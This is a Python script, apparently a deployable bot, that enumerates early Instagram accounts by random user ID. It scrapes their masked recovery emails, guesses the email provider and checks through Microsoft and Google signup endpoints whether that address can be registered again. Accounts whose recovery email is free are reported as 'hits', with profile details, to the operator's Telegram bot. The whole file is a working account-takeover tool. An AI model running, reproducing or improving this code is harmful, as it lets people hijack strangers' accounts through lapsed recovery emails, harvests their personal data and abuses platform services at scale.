from hashlib import md5
from time import time
import requests
from uuid import uuid4
import os
from random import choice, randrange
import sys
from threading import Thread, Lock
from user_agent import generate_user_agent
import time as time_module
from flask import Flask
import traceback

# Create Flask app for Render
app = Flask(__name__)

# Disable Flask request logging
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Global stats with thread lock
stats_lock = Lock()
global_stats = {
    'hits': 0,
    'bad_ig': 0,
    'bad_email': 0,
    'good_ig': 0,
    'checked': 0
}

@app.route('/')
def home():
    with stats_lock:
        return f'''
        <h1>Instagram Checker Running</h1>
        <p>Status: Active</p>
        <p>Checked: {global_stats['checked']}</p>
        <p>Hits: {global_stats['hits']}</p>
        <p>Good Instagram: {global_stats['good_ig']}</p>
        <p>Bad Instagram: {global_stats['bad_ig']}</p>
        <p>Bad Email: {global_stats['bad_email']}</p>
        '''

@app.route('/health')
def health():
    return {'status': 'running', 'stats': global_stats}

class InstagramChecker:
    def __init__(self):
        self.token = os.environ.get('TELEGRAM_TOKEN') or input('[+] Enter Token : ')
        if not os.environ.get('TELEGRAM_TOKEN'):
            os.system('clear' if os.name == 'posix' else 'cls')
        
        self.chat_id = os.environ.get('TELEGRAM_CHAT_ID') or input('[+] Enter ID : ')
        if not os.environ.get('TELEGRAM_CHAT_ID'):
            os.system('clear' if os.name == 'posix' else 'cls')
        
        self.MIN_USER_ID = 1
        self.MAX_USER_ID = 150000000
        
        print(f"[+] Targeting 2010-2012 era users (ID range: {self.MIN_USER_ID:,} - {self.MAX_USER_ID:,})")
        print("[+] Ranges: 2010 (1-1M) | Early 2011 (1M-10M) | Late 2011 (10M-50M) | 2012 (50M-150M)")
        
        # Initialize Hotmail tokens
        self.init_hotmail_tokens()
        
        # Send startup message
        self.send_startup_message()
        
        # Start worker threads
        num_threads = int(os.environ.get('NUM_THREADS', '50'))
        print(f"[+] Starting {num_threads} threads...")
        
        for i in range(num_threads):
            Thread(target=self.worker, args=(i,), daemon=True).start()
        
        print("[+] All threads started!")
        print("="*60)

    def init_hotmail_tokens(self):
        """Initialize Hotmail API tokens"""
        retry_count = 0
        while True:
            try:
                headers = {
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
                }
                response = requests.get('https://signup.live.com/signup', headers=headers, timeout=10)
                canary = str.encode(response.text.split('"apiCanary":"')[1].split('"')[0]).decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
                self.amsc = response.cookies.get_dict()['amsc']
                
                cookies = {'amsc': self.amsc}
                headers['canary'] = canary
                headers['content-type'] = 'application/json; charset=utf-8'
                
                json_data = {'clientExperiments': [{'parallax': 'enableplaintextforsignupexperiment', 'control': 'enableplaintextforsignupexperiment_control', 'treatments': ['enableplaintextforsignupexperiment_treatment']}]}
                
                response = requests.post('https://signup.live.com/API/EvaluateExperimentAssignments', cookies=cookies, headers=headers, json=json_data, timeout=10).json()
                self.canary = response['apiCanary']
                print("[+] Hotmail tokens initialized")
                return
            except Exception as e:
                retry_count += 1
                print(f"[!] Hotmail init error (attempt {retry_count}): {str(e)[:100]}")
                time_module.sleep(3)

    def send_startup_message(self):
        """Send startup notification"""
        msg = f'''🚀 Instagram Checker Started! 🚀
═══════════════════════════
✅ Status: Running
🎯 Target: 2010-2012 Era
📊 Range: 1 - 150,000,000
🧵 Threads: {os.environ.get('NUM_THREADS', '50')}
⏰ Time: {time_module.strftime('%Y-%m-%d %H:%M:%S')}
═══════════════════════════
by: @m0hsvn'''
        
        if self.send_telegram(msg):
            print("[✓] Startup message sent!")
        else:
            print("[!] Failed to send startup message - check token/chat_id")

    def send_telegram(self, message, max_retries=3):
        """Send message to Telegram with retries"""
        for attempt in range(max_retries):
            try:
                response = requests.post(
                    f'https://api.telegram.org/bot{self.token}/sendMessage',
                    data={'chat_id': self.chat_id, 'text': message},
                    timeout=10
                )
                if response.status_code == 200:
                    return True
                print(f"[!] Telegram error {response.status_code}: {response.text[:100]}")
            except Exception as e:
                print(f"[!] Telegram send error: {str(e)[:100]}")
            time_module.sleep(2)
        return False

    def check_instagram(self, username):
        """Check if Instagram account exists"""
        try:
            csrftoken = md5(str(time()).encode()).hexdigest()
            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Instagram 113.0.0.39.122 Android',
                'x-csrftoken': csrftoken,
            }
            data = {'username': f'{username}@test.com'}
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=8)
            return 'showAccountRecoveryModal' in response.text or 'user' in response.text
        except:
            return False

    def get_recovery_email(self, username):
        """Get recovery email from Instagram"""
        try:
            headers = {
                'User-Agent': 'Instagram 100.0.0.17.129 Android',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            data = {
                'signed_body': f'SIGNATURE.{{"query":"{username}"}}',
                'ig_sig_key_version': '4',
            }
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data, timeout=8)
            return response.json().get('email')
        except:
            return None

    def validate_recovery(self, username, recovery_email):
        """Check if recovery email matches username pattern"""
        if not recovery_email:
            return False
        try:
            masked = recovery_email.split('@')[0]
            return masked[0].lower() == username[0].lower() and masked[-1].lower() == username[-1].lower()
        except:
            return False

    def guess_domain(self, recovery_email):
        """Guess email domain from masked recovery"""
        if not recovery_email:
            return None
        try:
            domain = recovery_email.split('@')[1].lower()
            if '*' not in domain:
                return domain
            
            first = domain[0]
            length = len(domain)
            
            mappings = {
                'g': {9: 'gmail.com', 10: 'gmail.com'},
                'h': {11: 'hotmail.com', 12: 'hotmail.com'},
                'o': {11: 'outlook.com'},
                'y': {9: 'yahoo.com', 10: 'yahoo.com'},
                'a': {7: 'aol.com', 8: 'aol.com'},
                'i': {10: 'icloud.com', 11: 'icloud.com'},
                'l': {8: 'live.com'},
                'm': {7: 'msn.com', 8: 'mail.com', 9: 'mail.com'}
            }
            
            if first in mappings and length in mappings[first]:
                return mappings[first][length]
            
            defaults = {'g': 'gmail.com', 'h': 'hotmail.com', 'o': 'outlook.com', 'y': 'yahoo.com', 'a': 'aol.com'}
            return defaults.get(first)
        except:
            return None

    def check_gmail(self, email):
        """Check Gmail availability"""
        try:
            username = email.split('@')[0]
            headers = {
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'user-agent': generate_user_agent(),
            }
            data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{username}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3948%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&'
            response = requests.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute', headers=headers, data=data, timeout=8)
            return 'signup' in response.text
        except:
            return False

    def check_hotmail(self, email):
        """Check Hotmail/Outlook availability"""
        try:
            headers = {
                'canary': self.canary,
                'content-type': 'application/json',
            }
            response = requests.post('https://signup.live.com/API/CheckAvailableSigninNames', cookies={'amsc': self.amsc}, headers=headers, json={'signInName': email}, timeout=8)
            return '"isAvailable":true' in response.text
        except:
            return False

    def get_profile_info(self, username):
        """Get Instagram profile details"""
        try:
            headers = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-ig-app-id': '936619743392459',
            }
            response = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/', params={'username': username}, headers=headers, timeout=8).json()
            user = response['data']['user']
            return {
                'id': user.get('id'),
                'followers': user.get('edge_followed_by', {}).get('count'),
                'following': user.get('edge_follow', {}).get('count'),
                'posts': user.get('edge_owner_to_timeline_media', {}).get('count'),
                'private': user.get('is_private'),
                'name': user.get('full_name'),
                'bio': user.get('biography')
            }
        except:
            return {}

    def worker(self, thread_id):
        """Main worker thread"""
        while True:
            try:
                user_id = randrange(self.MIN_USER_ID, self.MAX_USER_ID)
                
                # Get username from ID
                try:
                    headers = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'user-agent': 'Mozilla/5.0',
                        'x-ig-app-id': '936619743392459',
                    }
                    data = {'variables': f'{{"id":"{user_id}","render_surface":"PROFILE"}}', 'doc_id': '7663723823674585'}
                    response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data, timeout=8).json()
                    username = response['data']['user']['username']
                except:
                    continue
                
                with stats_lock:
                    global_stats['checked'] += 1
                    checked = global_stats['checked']
                
                print(f"[{thread_id}] Checking: {username} (#{checked})")
                
                # Check Instagram
                if not self.check_instagram(username):
                    with stats_lock:
                        global_stats['bad_ig'] += 1
                    print(f"[{thread_id}] ✗ No Instagram: {username}")
                    continue
                
                with stats_lock:
                    global_stats['good_ig'] += 1
                
                print(f"[{thread_id}] ✓ Has Instagram: {username}")
                
                # Get recovery email
                recovery = self.get_recovery_email(username)
                if not recovery:
                    print(f"[{thread_id}] ✗ No recovery: {username}")
                    self.send_telegram(f"⚠️ Account: {username}\n❌ No recovery email\n🔗 instagram.com/{username}")
                    continue
                
                print(f"[{thread_id}] Recovery: {recovery}")
                
                # Validate pattern
                if not self.validate_recovery(username, recovery):
                    print(f"[{thread_id}] ✗ Pattern mismatch: {username}")
                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n❌ Pattern mismatch\n🔗 instagram.com/{username}")
                    continue
                
                # Guess domain
                domain = self.guess_domain(recovery)
                if not domain:
                    print(f"[{thread_id}] ✗ Unknown domain: {recovery}")
                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n❌ Unknown domain\n🔗 instagram.com/{username}")
                    continue
                
                print(f"[{thread_id}] Domain: {domain}")
                
                # Check availability
                email = f"{username}@{domain}"
                available = False
                
                if domain in ['hotmail.com', 'outlook.com', 'live.com', 'msn.com']:
                    available = self.check_hotmail(email)
                elif domain == 'gmail.com':
                    available = self.check_gmail(email)
                else:
                    available = True  # Can't check, assume available
                
                if not available:
                    with stats_lock:
                        global_stats['bad_email'] += 1
                    print(f"[{thread_id}] ✗ Email taken: {email}")
                    self.send_telegram(f"⚠️ Account: {username}\n📩 Recovery: {recovery}\n📧 Email: {email}\n❌ Email taken\n🔗 instagram.com/{username}")
                    continue
                
                # HIT FOUND!
                with stats_lock:
                    global_stats['hits'] += 1
                    hits = global_stats['hits']
                
                print(f"[{thread_id}] 🎯 HIT #{hits}: {username}")
                
                # Get profile info
                profile = self.get_profile_info(username)
                
                # Send to Telegram
                msg = f'''🎯 HIT FOUND! 🎯
═══════════════════════════
📧 Email: {email}
👤 Username: {username}
👥 Followers: {profile.get('followers', 'N/A')}
👣 Following: {profile.get('following', 'N/A')}
📸 Posts: {profile.get('posts', 'N/A')}
🔒 Private: {profile.get('private', 'N/A')}
🔗 Link: instagram.com/{username}
🆔 ID: {profile.get('id', 'N/A')}
📝 Name: {profile.get('name', 'N/A')}
💬 Bio: {profile.get('bio', 'N/A')}
📩 Recovery: {recovery}
═══════════════════════════
Hit #{hits} | by: @m0hsvn'''
                
                if self.send_telegram(msg):
                    print(f"[{thread_id}] ✅ Sent to Telegram!")
                else:
                    print(f"[{thread_id}] ❌ Failed to send!")
                
            except Exception as e:
                print(f"[{thread_id}] ERROR: {str(e)[:100]}")
                time_module.sleep(1)

if __name__ == '__main__':
    checker = InstagramChecker()
    
    # Start Flask in background
    port = int(os.environ.get('PORT', 10000))
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True)
    flask_thread.start()
    
    print(f"[+] Web server running on port {port}")
    
    # Keep alive
    try:
        while True:
            time_module.sleep(60)
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
        sys.exit(0)
